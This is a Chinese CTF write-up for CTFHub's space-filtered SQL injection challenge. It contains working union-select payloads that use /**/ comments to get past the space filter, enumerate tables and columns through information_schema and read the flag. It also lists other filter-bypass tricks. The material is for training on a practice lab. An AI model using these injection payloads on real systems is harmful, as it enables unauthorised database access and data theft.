---
title: CTFHub 过滤空格
date: 2026-09-30
categories: CTFHub Web
tags: CTFHub Web SQL注入 Union注入
---
# 题目： CTFHub 过滤空格

## 题目描述
题目考点：SQL空格过滤绕过 + 基础Union注入
题目限制：过滤普通空格    ，常规  union select  语句无法直接使用，需要绕过空格检测。
解题环境：网页在线靶场，无需 Kali、无需 Burp，纯页面输入框完成注入。

## 解题思路
1. 题目拦截普通空格，需要使用注释符  /**/  替代空格完成语句分割。
2. 先判断字段列数、回显位置。
3. 依次查询：数据库 → 数据表 → 字段名。
4. 读取真实数据拿到 Flag。

## 解题步骤
1. 查所有表： 0/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database() 
- 得到表： cbvwynlmrs 、 news 
2. 查目标表字段： 0/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='cbvwynlmrs' 
- 得到字段： gfixvvkiwd 
3. 读取数据： 0/**/union/**/select/**/1,gfixvvkiwd/**/from/**/cbvwynlmrs
- 得到flagctfhub{4abb2082f966fcaba5c92ccd}

## 踩坑指南
1. 不要直接修改浏览器地址栏，地址栏会对 /**/ 做编码处理，失效；payload填入页面输入框，点击Search提交。
2. 表名、字段名都是随机字符串，不能想当然写 flag ，必须从information_schema查表获取。
3. 本题是2列，回显在第2个位置，所以把要读取的字段放在select第二个参数。

## 知识点总结
1. 空格绕过的几种常用方法
- /**/  注释绕过（本题用的）
- %09  Tab制表符
- %0a  换行符
- 括号 () ，如 union(select(1),(data)from(table))
